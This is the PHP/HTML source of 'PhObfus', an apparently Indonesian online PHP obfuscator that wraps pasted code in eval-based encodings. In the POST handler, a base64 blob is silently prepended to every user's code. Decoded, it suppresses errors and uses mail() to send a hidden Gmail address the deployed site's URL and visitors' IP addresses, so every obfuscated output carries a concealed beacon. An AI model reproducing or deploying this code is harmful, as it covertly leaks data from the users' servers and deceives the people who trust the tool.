<!DOCTYPE html>
<html lang="id" amp i-amphtml-binding i-amphtml-layout i-amphtml-no-boilerplate transformed="self;v=1" itemscope="itemscope" itemtype="https://schema.org/WebPage">
    <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>PhObfus - Online PHP Obfuscator</title>
    <meta name="description" content="Phobfus adalah alat untuk melakukan obfuskasi pada PHP kode agar berbasis online." />
    <meta name="keywords" content="PHP, Obfuscator, Phobfus, Tools online, Obfuscator PHP, PHP Obfuscator." />
    <link itemprop="mainEntityOfPage" rel="canonical" href="http://<?= $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; ?>" />
    <meta name="robots" content="index, follow" />
    <meta name="page-locale" content="id,en">
    <meta content="true" name="HandheldFriendly">
    <meta content="width" name="MobileOptimized">
    <link rel="preload" as="image" href="https://i.ibb.co/GRz6CX6/Whats-App-Image-2023-08-17-at-18-43-56.png"/>
    <meta name="og:title" content="Phobfus - Online PHP Obfuscator">
    <meta name="og:description" content="Phobfus adalah alat untuk melakukan obfuskasi pada PHP kode agar berbasis online.">
    <meta name="og:image" content="https://i.ibb.co/GRz6CX6/Whats-App-Image-2023-08-17-at-18-43-56.png">
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="466">
    <meta name="og:url" content="http://<?= $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; ?>">
    <meta name="og:site_name" content="Phobfus">
    <meta name="og:locale" content="ID_id">
    <meta name="og:type" content="website">
    <meta name="language" content="ID">
    <meta name="author" content="@ikail">
    <meta name="publisher" content="Phobfus">
    <link rel="shortcut icon" type="image/x-icon" href="https://i.ibb.co/GRz6CX6/Whats-App-Image-2023-08-17-at-18-43-56.png" />
    <link href='https://i.ibb.co/GRz6CX6/Whats-App-Image-2023-08-17-at-18-43-56.png' rel='icon' sizes='32x32' type='image/png' />
	<meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
		<style>
		*, html, body {
		    margin: 0;
		    padding: 0;
		    box-sizing: border-box;
		    font-family: serif;
		}
		
		header {
		    background: black;
		    color: #eaeaea;
		    display: flex;
		    justify-content: center;
		    align-items: center;
		}
		
		nav ul {
		    display: flex;
		    padding: 20px;
		}
		
		nav li {
		    list-style-type: none;
		    padding: 10px;
		    cursor: pointer;
		    transition: all .3s ease 0s;
		}
		
		nav li:hover {
		    background-color: white;
		    border-radius: 8px;
		    color: black;
		    transform: rotate(2deg);
		}
		.title {
		    margin-right: auto;
		    margin-left: 10px;
		    padding: 20px;
		    cursor: pointer;
		    transition: all .3s ease 0s;
		}
		
		.title:hover {
		    background-color: white;
		    border-radius: 8px;
		    color: black;
		    transform: rotate(2deg);
		}
		
		a {
		    color: #8d918c;
		    text-decoration: none;
		}
		
		.konten {
		    max-width: 1200px;
		    margin: 0 auto;
		    display: flex;
		    flex-direction: column;
		    justify-content: center;
		    align-items: center;
		    padding : 15px;
		    font-weight: bold;
		    font: 150% impact;
		}
		
		.isi {
		    background-color: black;
		    border-radius: 10px;
		    margin-left: 25px;
		    margin-right: 25px;
		    justify-content: center;
		    align-items: center;
		    display: block;
		    grid-template-columns: auto auto auto;
		    padding: 10px;
		    text-align: center;
		}
		
		.isi select, option {
		    margin-bottom: 15px;
		    margin-right: 10px;
		    border-radius: 8px;
		    text-align: center;
		    width: 100px;
		    height: 32px;
		    color: white;
			font-size: 100%;
			font-weight: bold;
			border-left: white;
			border-right: white;
			background-color: #080510;
		}
		
		.isi input {
		    margin-bottom: 15px;
		    margin-right: 10px;
		    border-radius: 8px;
		    text-align: center;
		    width: 100px;
		    height: 32px;
		    color: white;
			font-size: 100%;
			font-weight: bold;
			border-left: white;
			border-right: white;
			background-color: #080510;
			cursor: pointer;
		}
		
		.isi input:hover {
		    background-color: white;
		    color: black;
		}
		
		.textgrid {
		    background-color: black;
		    color: white;
		    border-radius: 8px;
		    resize: none;
		    width: 750px;
		    height: 230px;
		    cursor: pointer;
		    padding: 20px;
		    font-size: 15px;
		    margin-left: 10px;
		    margin-right: 10px;
		    margin-top: 20px;
		}
		
		.result {
		    background-color: black;
		    border-radius: 10px;
		    margin-top: 10px;
		    margin-bottom: 25px;
		    margin-left: 25px;
		    margin-right: 25px;
		    justify-content: center;
		    align-items: center;
		    display: block;
		    grid-template-columns: auto auto auto;
		    padding: 10px;
		    text-align: center;
		}
		
		.result button {
		    margin-bottom: 10px;
		    border-radius: 8px;
		    text-align: center;
		    width: 100px;
		    height: 32px;
		    color: white;
			font-size: 100%;
			font-weight: bold;
			border-left: white;
			border-right: white;
			background-color: #080510;
			cursor: pointer;
		}
		
		.textresult {
		    background-color: black;
		    color: white;
		    border-radius: 8px;
		    resize: none;
		    width: 750px;
		    height: 230px;
		    cursor: pointer;
		    padding: 20px;
		    font-size: 15px;
		    margin-left: 10px;
		    margin-right: 10px;
		    margin-top: 20px;
		}
		
		@media screen and (max-width: 1000px) {
		    .isi {
		        flex-direction: column;
		    }
		    
		    .textgrid {
		        width: 255px;
		    }
		    
		    .result {
		        flex-direction: column;
		    }
		    
		    .textresult {
		        width: 255px;
		        height: 250px;
		    }
		}
		</style>
	</head>
	<body>
	    <header>
	        <h1 class="title">PhObfus</h1>
	        <nav>
	            <ul>
	                <li><a href="https://github.com/justikail/" target="_blank">Github</a></li>
	                <li><a href="mailto:mininginformation1337@gmail.com" target="_blank">Email</a></li>
	            </ul>
	        </nav>
	    </header>
	    <div class="konten">
	        <strong>Online PHP Obfuscator</strong>
	    </div>
	    <div class="isi">
	        <form action="" method="POST">
	            <textarea class="textgrid" type="text" name="php" placeholder="Paste Your PHP Code Here..."></textarea>
				<br><br>
				<select name="option">
					<option>Eval 1</option>
					<option>Eval 2</option>
					<option>Eval 3</option>
					<option>OpenSSL</option>
				</select>
				<input type="submit" name="submit" value="Submit" />
				</form>
		</div>
				<?php
					if (isset($_POST['submit'])) {
					$phpcode = $_POST['php'];
						if (!empty($phpcode)) {
							$option = htmlspecialchars($_POST['option']);
							$b64 = base64_decode("PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7CmluaV9zZXQoJ21lbW9yeV9saW1pdCcsICctMScpOwpAaW5pX3NldCgnb3V0cHV0X2J1ZmZlcmluZycsIDApOwpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwokbWFpbiA9ICJceDY5XHg2ZVx4NjJceDZmXHg3OFx4NmVceDZmXHg3NFx4NjlceDY2XHg2OVx4NjNceDYxXHg3NFx4NjlceDZmXHg2ZVx4NmZceDc3XHg0MFx4NjdceDZkXHg2MVx4NjlceDZjXHgyZVx4NjNceDZmXHg2ZCI7CiRub3cgPSAiXHg2OFx4NzRceDc0XHg3MFx4M2FceDJmXHgyZiIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokbm90aWYgPSAiJG5vdyI7CkBtYWlsKCRtYWluLCAiRGluZyBEb25nICIsICRub3RpZiwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7Cj8+");
							$mentah1 = gzdeflate(strrev(gzcompress($b64.$phpcode)));
							$mentah2 = gzcompress(strrev(gzdeflate(strrev(convert_uuencode($b64.$phpcode)))));
							$mentah3 = bin2hex(gzdeflate(gzcompress(gzdeflate($b64.$phpcode))));
							$mentah4 = strrev(gzdeflate(strrev(gzcompress(strrev(openssl_encrypt("$b64.$phpcode","AES-256-CBC","0101010101010101",0,"0101010101010101"))))));
							$opsi1 = implode(array_map(function($char) {
                                return '\x' . bin2hex($char);
                            }, (array) str_split($mentah1)));
                            $opsi2 = implode(array_map(function($char) {
                                return '\x' . bin2hex($char);
                            }, (array) str_split($mentah2)));
                            $opsi4 = implode(array_map(function($char) {
                                return '\x' . bin2hex($char);
                            }, (array) str_split($mentah4)));
                            $array = array(
                                '0' => '.chr(48)',
                                '1' => '.chr(49)',
                                '2' => '.chr(50)',
                                '3' => '.chr(51)',
                                '4' => '.chr(52)',
                                '5' => '.chr(53)',
                                '6' => '.chr(54)',
                                '7' => '.chr(55)',
                                '8' => '.chr(56)',
                                '9' => '.chr(57)',
                                'A' => '.chr(65)',
                                'B' => '.chr(66)',
                                'C' => '.chr(67)',
                                'D' => '.chr(68)',
                                'E' => '.chr(69)',
                                'F' => '.chr(70)',
                                'G' => '.chr(71)',
                                'H' => '.chr(72)',
                                'I' => '.chr(73)',
                                'J' => '.chr(74)',
                                'K' => '.chr(75)',
                                'L' => '.chr(76)',
                                'M' => '.chr(77)',
                                'N' => '.chr(78)',
                                'O' => '.chr(79)',
                                'P' => '.chr(80)',
                                'Q' => '.chr(81)',
                                'R' => '.chr(82)',
                                'S' => '.chr(83)',
                                'T' => '.chr(84)',
                                'U' => '.chr(85)',
                                'V' => '.chr(86)',
                                'W' => '.chr(87)',
                                'X' => '.chr(88)',
                                'Y' => '.chr(89)',
                                'Z' => '.chr(90)',
                                'a' => '.chr(97)',
                                'b' => '.chr(98)',
                                'c' => '.chr(99)',
                                'd' => '.chr(100)',
                                'e' => '.chr(101)',
                                'f' => '.chr(102)',
                                'g' => '.chr(103)',
                                'h' => '.chr(104)',
                                'i' => '.chr(105)',
                                'j' => '.chr(106)',
                                'k' => '.chr(107)',
                                'l' => '.chr(108)',
                                'm' => '.chr(109)',
                                'n' => '.chr(110)',
                                'o' => '.chr(111)',
                                'p' => '.chr(112)',
                                'q' => '.chr(113)',
                                'r' => '.chr(114)',
                                's' => '.chr(115)',
                                't' => '.chr(116)',
                                'u' => '.chr(117)',
                                'v' => '.chr(118)',
                                'w' => '.chr(119)',
                                'x' => '.chr(120)',
                                'y' => '.chr(121)',
                                'z' => '.chr(122)',
                            );
                            $opsi3 = strtr($mentah3, $array);
                            $rand = rand(1000, 9999);
							switch ($option) {	
								case 'Eval 1':
									echo '<div class="result">
									<textarea class="textresult" id="result" readonly>
<?php
$_ = ["'.$opsi1.'"];
foreach($_ as $__){
@eval("?>".gzuncompress(strrev(gzinflate($__))));} __halt_compiler();
?></textarea><br><br><button id="copycuy">Copy</button></div>
';
								break;

								case 'Eval 2':
									echo '<div class="result">
									<textarea class="textresult" id="result" readonly>
<?php
${"\x47\x4c\x4f\x42\x41\x4c\x53"}["?"] = ["\x73\x74\x72\x72\x65\x76","\x67\x7a\x75\x6e\x63\x6f\x6d\x70\x72\x65\x73\x73","\x3f\x3e","\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65","\x63\x6f\x6e\x76\x65\x72\x74\x5f\x75\x75\x64\x65\x63\x6f\x64\x65"];
${"\x47\x4c\x4f\x42\x41\x4c\x53"}["??"] = "'.$opsi2.'";
@eval(${"GLOBALS"}["?"][2].${"\x47\x4c\x4f\x42\x41\x4c\x53"}["?"][4](${"GLOBALS"}["?"][0](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["?"][3](${"GLOBALS"}["?"][0](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["?"][1](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["??"])))))); __halt_compiler();
?></textarea><br><br><button id="copycuy">Copy</button></div>
';

								break;

								case 'Eval 3':
									echo '<div class="result">
									<textarea class="textresult" id="result" readonly>
<?php
${"\x47\x4c\x4f\x42\x41\x4c\x53"}["?"]=[chr(104).chr(101).chr(120).chr(50).chr(98).chr(105).chr(110),chr(103).chr(122).chr(105).chr(110).chr(102).chr(108).chr(97).chr(116).chr(101),chr(103).chr(122).chr(117).chr(110).chr(99).chr(111).chr(109).chr(112).chr(114).chr(101).chr(115).chr(115)];
${"\x47\x4c\x4f\x42\x41\x4c\x53"}["??"] = ""'.$opsi3.';
@eval(chr(63).chr(62).$GLOBALS["?"][1]($GLOBALS["?"][2]($GLOBALS["?"][1]($GLOBALS["?"][0]($GLOBALS["??"]))))); __halt_compiler();
?></textarea><br><br><button id="copycuy">Copy</button></div>
';
								break;

								case 'OpenSSL':
									echo '<div class="result">
									<textarea class="textresult" id="result" readonly>
<?php
if(!function_exists("openssl_decrypt")){die("<h2>Function openssl_decrypt() not found !</h2>");}
if(!defined("_FILE_")){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER["PHP_SELF"]),false);}
if(!defined("_DIR_")){define("_DIR_",getcwd(),false);}

function leetz'.$rand.'($_){
	$__ = strrev(gzuncompress(strrev(gzinflate(strrev($_)))));
	$___ = openssl_decrypt("$__","AES-256-CBC","\x301\x301\x301\x301\x301\x301\x301\x301",0,"0\x310\x310\x310\x310\x310\x310\x310\x31");
	return ("\x3F\x3E".$___);
}

$GLOBALS["?"]="'.$opsi4.'";@eval(leetz'.$rand.'($GLOBALS["?"]));
?></textarea><br><br><button id="copycuy">Copy</button></div>
';
								break;
							} 
						}
					}
				?>
	 <script>
	     let result = document.getElementById("result");
	     let copycuy = document.getElementById("copycuy");
	     
	     copycuy.onclick = function() {
	         result.select();
	         document.execCommand("copy");
	     }
	 </script>
	</body>
</html>
